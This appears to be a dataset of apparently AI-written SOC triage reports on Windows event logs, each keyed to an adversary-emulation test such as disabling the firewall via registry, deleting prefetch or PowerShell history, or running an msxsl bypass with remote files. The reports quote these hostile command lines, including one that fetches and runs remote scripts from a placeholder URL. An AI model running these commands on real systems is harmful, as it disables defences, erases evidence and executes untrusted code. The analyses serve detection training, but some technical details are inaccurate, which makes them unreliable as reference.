   - Disconnect the affected host from the network to prevent any further potential spread of malicious activity.
   - Conduct a thorough forensic investigation on the affected system to determine the scope of the intrusion and gather more details on any payloads delivered.

3. **Remediation Steps**:
   - Restore the system from a known good backup.
   - Apply security updates and patches to close any exploited vulnerabilities.
   - Review and harden PowerShell policies and network rules to prevent the execution of unauthorized scripts.
   - Implement monitoring and alerting for similar activities in the future to ensure quick detection.

4. **Broader Security Review**:
   - Perform a network-wide sweep for similar indicators to ensure no other systems have been compromised.
   - Educate users on recognizing and avoiding potential phishing attempts or other intrusion vectors.

In conclusion, the logs provide strong evidence of malicious activity targeting the CEO's machine, leveraging PowerShell and Edge in potentially unauthorized ways. Immediate security measures should be taken to mitigate this threat."
Modify UsePartialEncryptionKey Registry entry,"Upon reviewing the provided Windows event logs, several points of interest and concern have been identified that lean towards the indication of suspicious or potentially malicious activity. Here is a detailed analysis:

### Analysis of Log Entries

1. **Suspicious Use of `wevtutil.exe`:** 
   - There are multiple instances of `wevtutil.exe` being executed. This tool is commonly used to manage event logs but is also often used in attacks to clear logs. Multiple rapid successive launches (`ProcessId`: 1972, 2596, 3088, 3424, 4056) might indicate attempts to tamper with event logs.

2. **Abnormal Command Execution:**
   - The execution of `cmd.exe` with command-line parameters involving registry modifications is notable (`ProcessId`: 6868):
     ```
     ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f
     ```
     This indicates a registry change which might be associated with system policies modification without user consent, a typical behavior in certain attacks.

3. **Unusual and Rapid Execution Sequence:**
   - Following the `cmd.exe` execution, there’s involvement of `reg.exe` suggesting the registry operation was executed (`ProcessId`: 6304).

4. **System Time Manipulation:**
   - The logs reveal time adjustments via `svchost.exe` (`EventID`: 24, 1 in System log and Security log), which may sometimes indicate efforts to confuse logging or bypass timestamp-based monitoring triggers.

5. **Repeated Use of `wsmprovhost.exe`:**
   - The consistent parent process for several executions indicates potential use or abuse of a legitimate administrative tool which may be leveraged in exploitation processes.

6. **Edge Update Executions:**
   - There is a high frequency of Microsoft Edge Update processes being started. However, there’s no immediate indication they are part of the compromise, but they could be red flags if combined with other logs.

### Assessment

- **Threats/Indicators:**
  - Tools and command-line arguments observed in the logs, such as `wevtutil.exe` for event log management and registry modifications executed via `cmd.exe`, are frequently leveraged in malicious activities.
  - The rapid sequential execution without typical administrative context suggests automated or scripted actions, often seen in attack scenarios.

### Guidance

- **Resolution: SUSPICIOUS**
  - While there is no definitive proof of a compromise based solely on these logs, the activity is unusual enough to warrant further investigation.
  - Immediate follow-up should include:
    - Verifying the integrity and intention behind the registry changes and their impact.
    - Correlating other system changes or network activities during the same timeframe.
    - Monitoring the impacted systems closely for any deviations or unauthorized activities.
    - Reviewing access logs for the account `SERVER002\admin_test` for any suspicious patterns or unauthorized usage.

### Next Steps

1. **Containment:** Ensure that there are no ongoing malicious processes or unauthorized access.
2. **Investigation:** Use additional logging tools or forensic software to gather more information about the events around the suspicious activities.
3. **Remediation and Patching:** Apply any necessary security patches and configurations to prevent misuse of tools like `wevtutil.exe` and to control registry access.
4. **Alerting and Monitoring:** Enhance real-time monitoring and alerts for similar activities to detect early signs of exploitation."
Requires the BitLocker PIN for Pre-boot authentication,"### Log Analysis and Findings:

Upon reviewing the provided Sysmon, System, and Security logs, I've identified several key points that merit consideration:

- **Process Execution Monitoring**:
  - **whoami.exe** and **hostname.exe** executions: These utilities are benign and primarily used for gathering system information. They appeared several times and do not inherently indicate malicious activity unless corroborated with other suspicious actions.
  - **conhost.exe** and **wevtutil.exe** associates: The frequent spawning of conhost.exe is typically related to console-related processes. Wevtutil.exe is used for viewing and exporting event logs. Multiple invocations could indicate someone is monitoring or altering logs, though it's not conclusive of malicious activity alone.
  - **Registry Modification via cmd.exe**: A command was executed using `cmd.exe` to modify a registry setting under `HKLM\SOFTWARE\Policies\Microsoft\FVE`. The command `/c reg add ... /v UseAdvancedStartup ...` implies system policy modification, which is suspicious if not sanctioned by IT policies.

- **File System Activity**:
  - **MicrosoftEdgeUpdate.exe** executions: These entries reflect automated updates from Microsoft Edge and appear to be running under the NT AUTHORITY\SYSTEM account, which is typical for system processes and unlikely to be an immediate threat.

- **Time Change Events**:
  - Time change events in the System and Security logs (`EventID: 4616`) indicate adjustments to the system clock. Time changes can be used to evade detection by altering timestamps, although on its own, it may just reflect normal time synchronization.

### Assessment and Advancement:

- **Assessment**: Based on the current log entries, there is one notable suspicious activity: the modification of a system registry key related to BitLocker settings, which was executed under an admin account. This activity potentially modifies startup security policies and should not occur without proper authorization. Given the context, the frequent generation of wevtutil logs also raises potential concerns for log manipulation.

- **Resolution**:
  - **SUSPICIOUS**: The registry modification and repeated invocation of system file access utilities like conhost.exe and wevtutil.exe under admin credentials, combined with the absence of contextual application logs, suggest potentially suspicious behavior that needs further investigation.
  
### Recommended Actions:
1. **Review IT Change Logs**: Confirm whether the registry modification is sanctioned as part of system configuration changes or automation. Any unsanctioned changes should be reviewed further.
2. **User Activity Verification**: Investigate recent activities by the `SERVER002\admin_test` user account. Validate if activities align with expected responsibilities and confirm the legitimacy of these actions.
3. **Monitor System Logs**: Continue monitoring the system and application logs for unsanctioned access or further anomalies. Consider implementing alerts for unexpected registry changes or process executions related to system utilities.
4. **Implement Enhanced Auditing**: Enable or review audit logging for registry changes, especially those related to security configurations like BitLocker, to capture detailed information on such modifications.

The findings warrant further action to rule out or confirm malicious intent."
Disable Microsoft Defender Firewall via Registry,"Upon examining the provided Windows event logs across Security, Application, Sysmon, and System channels, a few points of interest and potential concerns arise:

1. **Security Log Observations**:
   - Multiple `EventID 4624 - An account was successfully logged on` with `LogonType 3`, indicating network logon, are seen for the user `admin_test`. The logon was performed using the NTLM authentication method from `DESKTOP-3HL5B2P` with an IP address `192.168.0.102`, which warrants verification of the expected source.
   - `EventID 4672 - Special privileges assigned to new logon` for the user `admin_test` which includes privilege like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeImpersonatePrivilege`. These privileges are sensitive and could allow for further malicious behavior if misused.
   - The `admin_test` user session ends suspiciously quickly, potentially indicating automated scripts or processes.

2. **Sysmon Log Observations**:
   - Sysmon logs reveal the execution of several system utilities such as `wevtutil.exe`, `cmd.exe`, and `reg.exe` under the user `admin_test`, which is concerning given the command-line activity reported:
     - A command to modify the Windows Firewall state (`reg add ... /v ""EnableFirewall"" /t REG_DWORD /d 0 /f`) suggests disabling the firewall. This is a particularly suspicious action and a common tactic used by malware or unauthorized intrusion attempts to ease further network access or communication.
   - The use of `wevtutil.exe`, `conhost.exe`, and `hostname.exe` in rapid succession suggests potential script execution. Notably, the usage pattern of these utilities is consistent with enumeration or administrative tasks performed rapidly, possibly by an automated script or unauthorized attacker.

3. **Application and System Logs**:
   - The presence of numerous Edge updater processes is noted, though these seem benign and likely relate to regular update and registration tasks for Microsoft Edge.
   - The time sync adjustments (`EventID 35') are standard and controlled by valid processes. This indicates no manipulation or tampering with the system time settings affecting log accuracy.

4. **Concerns and Risk Assessment**:
   - The sudden and systematic disabling of the firewall, particularly under a privileged account session (`admin_test`), presents a substantial risk. This action is typically unauthorized in regular operations and suggests preparatory steps for further compromise or lateral movement within the network.
   - The initiation of high-integrity utilities suggests either a misconfigured system allowing unauthorized execution or malicious intent by an authorized user.

**Conclusion and Recommendation**:
- **Resolution**: MALICIOUS. 
- **Assessment**: The logs provide strong indicators of potentially malicious activity, specifically with the disabling of firewall settings performed under a privileged account `admin_test`.
- **Actionable Steps**:
  - Immediately investigate and audit the `admin_test` account. Ensure its activities and intended usage comply with organization policies. Consider temporarily disabling the account pending investigation.
  - Verify any scripts or scheduled tasks running on `Server002` to identify unauthorized automation potentially causing these events.
  - Investigate `DESKTOP-3HL5B2P` and the `192.168.0.102` address to verify authorized access and eliminate any rogue devices.
  - Conduct a broader forensic review of network logs and adjacent systems around the timestamps reported to assess any lateral movement or additional compromises.
  - Reinforce firewall and EDR policies to prevent unauthorized changes to system defenses."
Delete a single file - Windows cmd,"### Detailed Analysis of the Windows Event Logs

#### Suspicious or Anomalous Behavior:

1. **Command Execution:**
   - There are multiple instances of `cmd.exe` being executed with conditional commands to check the existence or content of a file `deleteme_data.004` in the temporary directory and ultimately delete it. This behavior can be described as unusual because it seems automated and methodical.
   - The commands like `IF EXIST ""%temp%\\deleteme_data.004"" ( EXIT 0 ) ELSE ( EXIT 1 )` and `echo deleteme_data.004 >> %temp%\\deleteme_data.004` imply some form of scripted operation, managing a temporary file and checking its state. Such operations could be used in legitimate scripting but might also indicate an attempt to obfuscate or prepare files for execution.

2. **Process Lineage:**
   - The processes are executed under the context of a high-integrity user account, `SERVER002\\admin_test`, with the parent process being `wsmprovhost.exe`. This process is used for Windows Remote Management (WinRM), which might be legitimate, but if the user is not expected to perform such operations, it could signal unauthorized remote management actions.

3. **Use of Standard Utilities:**
   - The logs indicate repeated invocations of standard Windows utilities like `hostname.exe` and `whoami.exe`. These could be used for system enumeration by an attacker after gaining access, although they can also be part of regular administrative checks.

4. **Temporal Consistency:**
   - The sequence of commands and their repeat occurrences suggest either a script malfunction or a crafted batch script with self-cleaning behavior, evident from the repeated creation and deletion of the same file.
   
5. **Event Logs Manipulation Attempts:**
   - The presence of `wevtutil` executions might indicate attempts to manage or clear event logs, a common indicator of post-compromise activities where an attacker seeks to hide their tracks.

6. **Unexpected Activity Times:**
   - The timestamps of these activities are tightly packed and rapid, which suggests automated execution rather than manual user-driven operations.

#### Assessment of Malicious Activity:

- The command patterns observed through multiple `cmd.exe` executions and manipulations of temporary and system files are consistent with several post-exploitation frameworks utilized by attackers to gain persistence or recon the system for valuable information.
- The potential event log clearing (or querying) using `wevtutil` is highly suspicious unless this is a standard administrative practice on the network.
- The usage of high-integrity level processes under a likely administrative or test account could be a case of compromised credentials.

### Final Assessment: **SUSPICIOUS**

The log entries exhibit activities that could be indicative of either a security testing scenario (for example, a penetration test or misconfigured scripts) or malicious activity. This judgment is supported by the repetitive nature, the pattern of file handling, the potential concealment operations, and consistent high-integrity level execution.

### Recommendations:

1. **Immediate Actions:**
   - Verify the validity of the `admin_test` account actions by consulting the IT department or the user.
   - Confirm whether there are scheduled tasks or scripts that might explain the automation observed.

2. **Further Investigation:**
   - Perform a deep dive into network logs to ascertain if there were any unauthorized accesses or unsanctioned remote management sessions.
   - Analysis of the system for any newly added scheduled tasks or startup items.

3. **Enhanced Monitoring:**
   - Implement more detailed logging for any administrative actions or cmd executions on high-profile accounts like administrative test accounts.

4. **Ensure Logs Integrity:**
   - Review system integrity and ensure no logs are being deleted or altered post-factum.
   - Reevaluate logging configurations and retention policies.

These steps will help in validating whether the suspicious activities are indeed benign automated maintenance or indicate a deeper security issue."
Delete Prefetch File,"### Analysis of the Logs:

#### Windows PowerShell Log:
- The PowerShell logs show the execution of a command to remove items from the prefetch directory using `Remove-Item` with `Get-ChildItem`. This is suspicious because manipulating the prefetch files, which are used by Windows to speed up the startup of applications, is often associated with covering tracks, a common tactic used in malicious activities to avoid detection.

#### Security Log:
- **Event ID 4616:** Indicates a system time change using `svchost.exe`, which is not inherently malicious but could be used in conjunction with other activities to mask logs.
- **Event ID 4624 & 4672:** Reflects a successful system logon with elevated privileges. The SYSTEM account with a high number of privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.) is noted, indicating potential for misuse if malicious intent is present.
- **Event ID 5379:** A notable number of failures in reading credentials, with a consistent return code of `3221226021`, suggesting unsuccessful attempts to access credentials, which may imply attempted credential harvesting or probing.
- **Event ID 4798:** Reflects enumeration of the local group membership involving sensitive accounts, such as ""Administrator"" and ""Guest,"" which could be reconnaissance actions.

#### Application Log:
- The logs show Windows Defender is active, which is reassuring from a security posture but doesn't confirm or deny malicious activity without further contextual threat intelligence.

#### Sysmon Log:
- **Process Creation Events (Event ID 1):** Several processes like `whoami.exe`, `taskhostw.exe`, `wedtutil.exe`, and especially `powershell.exe` executed with CommandLines that appear routine but need to be contextualized given the concerning PowerShell activity.
- **File Creation Time (Event ID 5):** Frequent launches of utilities like `conhost.exe` alongside `wevtutil.exe` and PowerShell are logged. While common in normal operations, their combination and context, especially the PowerShell command's focus on prefetch deletion, is noteworthy.
  
### Assessment:
Based on the review of the logs, there are several indicators suggesting potentially malicious activity:
1. The use of PowerShell to remove prefetch files.
2. System time changes possibly attempted to disguise further actions.
3. Multiple failed credential access attempts and group enumeration potentially suggest attempts at reconnaissance or privilege escalation.

### Threats or Risks Identified:
- The PowerShell execution and credential probing point towards a possible compromise involving anti-forensics and reconnaissance activities.
- The activities can indicate an early stage attempt at privilege escalation or lateral movement preparation.

### Conclusion:
- **Resolution: SUSPICIOUS** - The logs demonstrate behavior that is anomalous and warrants further in-depth analysis. The PowerShell activity, in particular, should be scrutinized further, and any system modifications should be reviewed to understand if data exfiltration or further compromise might occur.

### Guidance on How to Proceed:
1. **Monitoring and Alerting:** Immediately increase monitoring of PowerShell activities and file access related to system binaries and user data directories.
2. **Audit Logs:** Review Windows Event logs, emphasizing account usage, process creation, and PowerShell usage, for increased system transparency.
3. **Cordon Off System**: If possible, isolate the affected system (Server002) from the network to prevent lateral movement until a complete forensic analysis is conducted.
4. **Manual Inspection:** Conduct a manual inspection of modifications in scheduled tasks, startup folders, and registry entries for other signs of persistence mechanisms.
5. **Engage Threat Intel:** Investigate current threat intelligence to match any known indicators of compromise (IOCs) with the suspicious activities identified in these logs.
  
Further investigation is essential to confirm the intent and scope of this behavior."
Clear Powershell History by Deleting History File,"**Detailed Analysis:**

Upon analyzing the provided logs from the System, Application, Security, Windows PowerShell, and Sysmon channels, here are the observations:

1. **System and Security Logs:**
   - Most events in the system and security logs relate to time synchronization (Event ID 4616) and adjustments made by the `svchost.exe` process, which is commonly used by Windows for running various services. This activity occurs frequently due to time updates from time.windows.com and does not inherently suggest any malicious intent.

2. **Application Log:**
   - The application log, particularly entry `Event ID 16384` related to the Software Protection Platform, indicates the normal operation of license checks and enforcement. There is no suspicious activity noted in this log entry.

3. **Windows PowerShell Logs:**
   - PowerShell logs show the execution of a script that removes the PSReadline history file: `Remove-Item (Get-PSReadlineOption).HistorySavePath`.
   - Erasing command history can indicate an attempt to conceal activity, which is suspicious, particularly when performed on a high-profile machine like the CEO’s.
   
4. **Sysmon Logs:**
   - The Sysmon logs reveal the execution of several processes, including `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `powershell.exe`.
   - `wevtutil.exe` and `conhost.exe` are standard Windows utilities but used in conjunction with removing PowerShell history can appear suspicious if not correlated with legitimate administrative activities.
   - The execution of `whoami.exe` and `hostname.exe` is common for system information gathering and may not be malicious unless tied to other suspicious activities.
   - The PowerShell entry shows the same command to remove history, executed by `admin_test`, suggesting potential unauthorized administrative activity or compromised administrative account misuse.

**Conclusion:**

- **Suspicious Activities:**
  - The use of PowerShell to remove command history, paired with the execution of administrative utilities (`wevtutil.exe`), hints at potentially malicious behavior aimed at covering up tracks. Especially when performed by a user with administrative privileges, this warrants further investigation.

- **Assessment:**
  This analysis identifies potential signs of suspicious activity, particularly focusing on the PowerShell command intended to erase command history, coupled with the execution of administrative commands through `wevtutil.exe` by an administrative account.

- **Recommended Actions:**
  1. **Investigate the 'admin_test' account** for any unauthorized activity or compromise.
  2. **Review recent changes or anomalies** in permissions related to this account.
  3. **Correlate PowerShell command execution with user behavior** to determine if this was legitimate administrative activity or potentially unauthorized.
  4. **Implement stricter audit logging** and review of command execution on high-value targets like the CEO’s machine.
  5. **Consider isolating the machine** for deeper forensic investigation.

**Resolution: SUSPICIOUS**

The identified activities require further investigation to confirm or nullify any security breaches. There is no direct evidence of malicious compromise yet, but the signs of potential obfuscation tactics raise concern."
WMIC bypass using local XSL file,"In the provided logs, we will analyze each category to identify any suspicious or anomalous behavior that could indicate malicious activity.

### Security Log Analysis

1. **Event 4624 (Logon Events)**: Multiple events show logon of the SYSTEM account via ""Advapi"" with a logon type of 5. Logon type 5 refers to a service logon, which is standard behavior for services interacting with the Windows operating system.

2. **Event 4672 (Special Privileges Assigned)**: The SYSTEM user is consistently being assigned a broad range of privileges (SeAssignPrimaryTokenPrivilege, SeDebugPrivilege, etc.). These are standard privileges associated with the SYSTEM account, which can perform high-level operations necessary for system management.

3. **Event 5379 (Credential Validation)**: Failed credential validation attempts for Microsoft Account and Windows Live targets are logged with a return code of 3221226021, which translates to ""STATUS_NOT_FOUND"". This could indicate attempts to access resources with incorrect credentials but is not inherently malicious by itself without more context.

4. **Event 4798 (Query for Local Group Membership)**: SYSTEM querying group memberships for several accounts, including Administrator, admin_test, and DefaultAccount. This could be normal behavior for assessing user permissions, especially during system operations.

### Sysmon Log Analysis

1. **Process Creation via PowerShell and Sysmon Events**: Multiple processes are created by the ""admin_test"" user, leveraging utilities like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `calc.exe`. While these activities could be part of legitimate system inventory tasks or diagnostics, their context needs more scrutiny. Executing commands like `wmic` with `.xsl` transformation is somewhat unusual for normal operations and may hint at data collection or reconnaissance.

2. **Edge Update Activity**: There is considerable activity logged regarding Microsoft Edge Update. Given their presence in the System and Application logs, these are likely part of regular updates and maintenance executed by the system.

3. **Unusual CMD and WMIC Execution**: The execution of `cmd.exe` with parameters to run `wmic process list` with specific formatting (`wmicscript.xsl`) could indicate automation or scripting for process enumeration. Such actions warrant further investigation as they deviate from typical user behavior unless they are part of scripted maintenance or inventory tasks.

### Application Log Analysis

- The Edge Update service logs indicate a normal start/stop sequence, which could be related to updates. There are no clear malicious applications or errors recorded within the application logs.

### Assessment

- **BENIGN**: The presence of SYSTEM account activities, privilege assignments, and Edge updates are normal components of Windows operations. The events logged describe typical system maintenance and updates.

- **SUSPICIOUS**: Unusual command-line activities, especially around the use of `wmic` with `.xsl` formatting and PowerShell scripts, could suggest abnormal use or potential reconnaissance. The actions warrant deeper checks into the intent and full context around these events, such as reviewing corresponding network logs or investigating the user's activities.

In conclusion, the logs predominantly contain benign activities associated with system updates and maintenance. However, due to the presence of atypical `wmic` and PowerShell usage, this scenario is flagged as **SUSPICIOUS** until further investigation can determine the legitimacy of these actions. The next step would be a deeper dive into network behavior during these timestamps, checking for any corresponding alerts, vulnerabilities on the system, or user role clarifications for ""admin_test"" actions."
Invoke CHM with default Shortcut Command Execution,"Upon reviewing the provided logs, I have conducted an analysis for any suspicious or anomalous behavior. Here is a detailed breakdown:

### Analysis:

1. **PowerShell Activity**:
   - The logs indicate that there was a sequence of PowerShell events (Event ID: 600) executed with the command:
     ```powershell
     powershell.exe & {Invoke-ATHCompiledHelp -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm}
     ```
   - This command is suspicious as it suggests an execution of a potentially non-standard or obfuscated PowerShell command. ""Invoke-ATHCompiledHelp"" and the use of a custom "".chm"" file path could indicate an attempt to execute a malicious script or payload through a compiled help file, which is a technique sometimes used by attackers for code execution.

2. **Process Execution**:
   - An entry (Sysmon Event ID: 1) was logged for ""powershell.exe"" being executed with high integrity level, which is often indicative of privilege escalation or execution with elevated privileges.
   - The Parent Process is identified as ""wsmprovhost.exe,"" which is associated with Windows Remote Management. This could suggest remote code execution if this is not a routine administrative activity.

3. **Other System Activities**:
   - Numerous process executions of ""wevtutil.exe"" and ""conhost.exe"" are logged in rapid succession, which might indicate attempts at managing or exporting event logs potentially to cover tracks or for reconnaissance.
   - ""whoami.exe"" and ""hostname.exe"" were run, potentially to gather system information and confirm active session credentials.

4. **Service Activity**:
   - There is a logged entry for the execution of ""sppsvc.exe"" (Software Protection Platform Service), which is standard but should be considered contextually with other activities. In isolation, this entry is benign.

### Assessment:

The pattern of operations (especially the PowerShell script involving custom execution) and the sequence of process executions point towards a high probability of compromised activity. The combination of potentially harmful PowerShell commands, along with the execution contexts and service interactions, raises significant concerns about unauthorized or malicious activities.

### Conclusion:

Based on the information available in the logs, the behaviors observed are **MALICIOUS**. There's sufficient evidence pointing to the execution of potentially harmful scripts and atypical command execution patterns.

### Guidance:

1. **Immediate Action**: Isolate the affected system from the network to prevent further potential compromise.
2. **Forensic Investigation**: Conduct a deeper forensic analysis of the system, particularly focusing on any dropped files, further PowerShell logs, and remote management configuration or settings.
3. **Review and Mitigation**: Evaluate PowerShell execution policies and audit logs for any changes; consider setting more restrictive execution policies.
4. **User Verification**: Verify and monitor the accounts involved, especially ""SERVER002\admin_test,"" for any further suspicious or unauthorized activities.

Given this is a high-value target such as the CEO’s machine, it is crucial to handle this situation with priority and rigor."
MSXSL Bypass using remote files,"Upon analyzing the provided logs from the Windows event logs for the host ""Server002,"" here is the detailed analysis and findings:

### Analysis of Logs:

1. **Sysmon Log Events:**
   - There are numerous executions involving standard Windows system utilities like `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `cmd.exe`, `whoami.exe`, and various Edge Update executables.
   - A particularly notable command line is the execution of `cmd.exe` with a sophisticated command using `msxsl.exe` to download scripts from GitHub:
     ```
     ""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\msxsl.exe"" ""https://raw.githubusercontent.com/file/file-file/master/files/data/src/msxslxmlfile.xml"" ""https://raw.githubusercontent.com/file/file-file/master/files/data/src/msxslscript.xsl""
     ```
   - This specific command reflects a potential attempt to execute remote scripts, which is suspicious and may indicate malicious intent.

2. **Security and System Logs:**
   - The logs indicate a change in system time, which can sometimes be an evasion tactic used by malware to confuse time-based logging and tracking.
   - The `ProcessId` and `ProcessName` fields point to normal Windows processes, but the time synchronization events should be verified for legitimacy.

3. **Edge Update Activities:**
   - The repeated appearances of `MicrosoftEdgeUpdate.exe` and its varying roles in these logs:
     - The service version controls `MicrosoftEdgeUpdate.exe` and the logs indicate it running multiple commands such as installation and updating mechanisms.
     - The normal operation of this background update service is sometimes seen as legitimate, depending on IT policy.

### Suspicious Activities Highlighted:
- **Potential Malicious Command Execution:**
  The use of `msxsl.exe` to execute scripts from GitHub is highly uncommon for typical user operations, suggesting a likely compromise or misuse of legitimate tools for executing external scripts without direct human input.
  
- **Frequent Time Adjustments:**
  Although timezone and time adjustments might be part of normal operations when adjusting for daylight saving time or syncing with time servers, sudden and repeated changes could also be characteristic of malicious activity altering logs.

### Indicators of Compromise:
- The combination of using utilities like `msxsl.exe` in a manner to download and potentially execute scripts from the internet suggests a misuse or potential exploitation.
- The time change activities, if found to be unauthorized, could suggest log manipulation attempts.

### Assessment and Resolution:
Based on the provided logs and the outlined suspicious activities, this situation necessitates deeper investigation. Hence, the resolution classification will be:

- **SUSPICIOUS** 

### Guidance for Further Actions:
- **Immediate Steps:**
  - Isolate the CEO's machine to prevent any further potential spread or data loss and perform a detailed scan with an up-to-date antivirus/malware solution.
  - Investigate the origin and purpose of the scripts downloaded from GitHub to determine their intent and impact.
  - Cross-check time adjustments with the IT policy or scheduled maintenance processes to determine if these are legitimate activities.
  
- **Long-term Steps:**
  - Implement more granular logging and monitoring for advanced warning signs and real-time detection.
  - Policies should dictate the need for heightened security measures around script execution, particularly from external sources.
  - Consider employee awareness training on the dangers of executing unverified external scripts.
  
This assessment reflects a need for deeper analysis due to potential signs of compromise, warranting cautious scrutiny and appropriate response measures."
Modify UseTPMPIN Registry entry,"Upon reviewing the provided Windows event logs, several observations can be made with regard to suspicious or potentially malicious activity. Here's a breakdown based on the entries from the Sysmon, Security, and System logs:

### Analysis

1. **Frequent Execution of Utility Tools**:
   - **Sysmon Events** show multiple executions of system utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` within a very short timeframe. While these tools are standard components in a Windows environment, the frequency and rapid sequence of their execution could suggest automated activity, possibly by a script or malicious process.

2. **CMD and Registry Modification**:
   - A particularly suspicious entry involves the execution of `cmd.exe` with the command to modify the registry: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f`. Such changes can be indicative of an attempt to alter system policies, which could suggest malicious intent, especially if not performed by a known and approved process or user.

3. **High Integrity Level Executions**:
   - The executed processes have a high integrity level, indicating they are running with elevated privileges, which could pose a significant security risk if these actions were initiated by an unauthorized or malicious actor.

4. **System Time Modification**:
   - **Security Events (4616)** and **System Events** indicate changes to system time by the `svchost.exe` process attributed to `LOCAL SERVICE`. While changing system time is a legitimate operation, if done without authorization or expected reason, it might indicate an attempt to manipulate the system logs or timestamps to cover tracks.

5. **Consistent User Context**:
   - The `SERVER002\admin_test` user context is consistently associated with these activities, including critical operations like registry modifications. If `admin_test` is not known for performing such activities, it could indicate either misuse of the account or credential compromise.

### Assessment

Based on these elements, the logs exhibit **SUSPICIOUS** behavior that warrants further investigation. The combination of rapid sequential execution of command-line utilities with elevated privileges and registry modifications presents a red flag, especially in the context of a high-profile user like the CEO's environment. However, without additional context regarding the legitimacy of these command-line activities (i.e., whether they were expected or authorized), it's not possible to definitively label this as malicious.

### Recommended Actions

1. **Immediate Validation**:
   - Verify if the `admin_test` account was legitimately used for these operations. Cross-check with user activity logs or authenticate with the account holder.

2. **Review Change Process**:
   - Confirm if there were any authorized changes or troubleshooting activities scheduled on this host that required such operations.

3. **Further Log Analysis**:
   - Conduct deeper log analysis across a broader timeline to identify any preceding or subsequent events. Look for any anomaly in logins, file modifications, or network connections.

4. **Behavior Analysis**:
   - Consider deploying behavior analysis tools to track real-time user and system behavior for early detection of genuine threats.

5. **Security Measures**:
   - Ensure that best security practices are being enforced, such as least privilege principles, proper audit logs, and ensuring all accounts use multifactor authentication.

### Resolution: SUSPICIOUS

This activity needs more context and investigation to determine if it genuinely poses a security threat or if it is simply a case of misunderstood or mismanaged administrative actions."
Create ADS command prompt,"**Analysis of Windows Event Logs**

Upon analyzing the provided logs, several key aspects require attention:

1. **Time Change Events:**
   - The `Security` and `System` logs include events detailing a change in system time. These are identified by EventID `4616` in the Security log and EventID `1` in the Kernel-General system log. The time was shifted backward by a few seconds.
   - The time change was conducted by the `svchost.exe` process running under the `LOCAL SERVICE` account (`S-1-5-19`). Typically, minor time adjustments may occur due to synchronization with time servers and are not inherently suspicious, but unwarranted frequent changes could be abuse for hiding activities.

2. **Execution of `cmd.exe` and Shell Code:**
   - The `Sysmon` log includes the execution of `cmd.exe` with a command line argument that writes to alternate data stream `adstest.txt` using shell code, which can be a technique for hiding commands or malicious activities (`EventRecordID`: `18000` and `18002`).
   - This kind of activity can be indicative of an attempt to execute hidden operations and is often seen in malicious scenarios or security testing exercises.

3. **Execution of `wevtutil.exe` and `conhost.exe`:**
   - Frequent executions of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test` are seen.
   - `wevtutil.exe` is commonly used for exporting event logs and can signify log clearing in malicious activities which aim to cover tracks.
   - Frequent invocations without clear purpose or pattern from a user might indicate scripting or automation of log analysis, but in correlation with other suspicious activities, it may suggest malicious intent.

4. **Presence of Privileged Logons:**
   - `EventID 4624` (An account was successfully logged on) and `4672` (Special privileges assigned to new logon) indicate that the account `admin_test` has high-level privileges, which include `SeDebugPrivilege` and `SeBackupPrivilege`, among others. Elevated privileges can be leveraged for stealthy execution of administrative tasks, which, combined with suspicious activities, raise red flags for privilege escalation.

5. **Execution of Known Tools:**
   - Tools such as `whoami.exe` and `hostname.exe` are executed, which are typically used for identifying the current user and system information. While these alone are not suspicious (as they may be used by admins), their context within the logs is noteworthy due to the surrounding activities.

**Assessment and Resolution:**

Given the execution pattern of commands involving potential shell code, the alteration in system time, and the presence of several security-sensitive privileges combined with the usage of utilities potentially for either tampering or hiding activities, the behavior observed within the provided logs is categorically unusual for a standard operational environment, especially on a CEO's machine.

**Final Resolution: SUSPICIOUS**

While the activities do not conclusively prove malicious intent without additional context, such as network traffic or further corroborating evidence, the logs contain distinct indicators that warrant further investigation. Thus, I recommend:

- Conducting a comprehensive review of processes and scheduled tasks on the CEO's machine.
- Analyzing network traffic for unauthorized connections or data exfiltration attempts.
- Reviewing user access logs and authentication attempts more broadly within the environment.
- Conducting a security audit or forensic investigation to thoroughly assess unauthorized access or modifications."
Hidden Window-Conhost Execution,"Upon reviewing the provided logs, several events stand out that suggest suspicious behavior:

1. **PowerShell Execution with Unusual Command Line**:
   - The log indicates the execution of PowerShell with the command line `powershell.exe & {conhost.exe --headless calc.exe}`. This behavior is unusual, as it involves PowerShell running another process (`conhost.exe`) with a `--headless` flag, which is not standard usage. Moreover, spawning `calc.exe` within this context is peculiar and could indicate an attempt to execute a payload within the calculator application as a form of living-off-the-land attack or process hollowing.

2. **Conhost and Calc Execution**:
   - There are multiple instances where `conhost.exe` and `calc.exe` are executed in a way that is not typical for their usual operation. For example, `conhost.exe` generally provides a console window buffer but here it’s executed with `--headless`, which hides the console from the user’s view.

3. **Frequent Use of System Commands**:
   - The logs show frequent execution of system utilities such as `whoami.exe`, `hostname.exe`, and `wevtutil.exe`, which could be part of a reconnaissance activity to gather system information or manipulate Windows Event Logs.

4. **Time Adjustments Detected**:
   - The system and security logs indicate adjustments of system time, which could be an attempt to evade detection or for timestamp manipulation within logs. Such adjustments are carried out using `svchost.exe`, which could be legitimate but in conjunction with other suspicious activity, increases concern.

5. **High Integrity Level of Commands**:
   - The commands in question are executed with a high integrity level, providing them with a significant level of system access, which would be ideal for malicious activities.

### Assessment:
The combination of unusual PowerShell activity, suspicious command line executions, the use of system commands for potential reconnaissance or log manipulation, and the adjustment of system times collectively point towards potentially malicious activity.

### Resolution:
- **MALICIOUS**: The logs contain several indicators of compromise, particularly the abnormal use of PowerShell to launch `conhost.exe` with an unconventional command line to run `calc.exe`. These activities are consistent with techniques used in malware execution or advanced persistent threat scenarios.

### Guidance:
- Immediate further investigation is recommended. Isolate the affected machine to prevent further potential spread.
- Conduct a thorough endpoint security check for any persistent threats.
- Review access logs around the time of these events to identify any unusual access patterns.
- Update antivirus and run a full scan to detect potential threats.
